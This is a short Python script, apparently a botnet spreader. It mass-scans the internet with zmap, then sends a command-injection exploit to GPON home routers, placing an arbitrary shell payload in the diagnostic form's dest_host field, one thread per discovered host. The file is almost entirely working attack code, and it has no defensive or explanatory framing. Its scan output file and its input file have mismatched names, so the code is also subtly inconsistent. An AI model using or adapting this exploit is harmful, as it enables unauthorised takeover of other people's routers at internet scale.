import requests, threading, os, time

class Infect_GPON(threading.Thread):
    def __init__(self, payload: str, ip: str):
        threading.Thread.__init__(self)
        self.addr = f'http://{ip}:443'
        self.payload = payload
        self.send = 0

    def run(self):
        payloads= [
            ('/GponForm/diag_Form?style/', f'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$({self.payload})&ipv=0'),
        ]
        
        try:
            for payload in payloads:
                requests.post(f'{self.addr}/{payload[0]}', timeout= 5, data= payload[1])
                self.send += 1
        except:
            pass
        
        print(f'[{self.addr}] payload sent: {self.send}/{len(payloads)}')

def run(payload: str):
    threading.Thread(target=os.system, args=('sudo zmap -p 443 -o gpon_vuln.txt --bandwidth=10M',)).start()

    blacklist= []
    with open('./zte_vuln.txt', 'r+') as zte_file:
        while True:
            time.sleep(1)
            for device in zte_file:
                device = device.split('\n')[0]

                if device not in blacklist:
                    blacklist.append(device)
                    Infect_GPON(payload, device).start()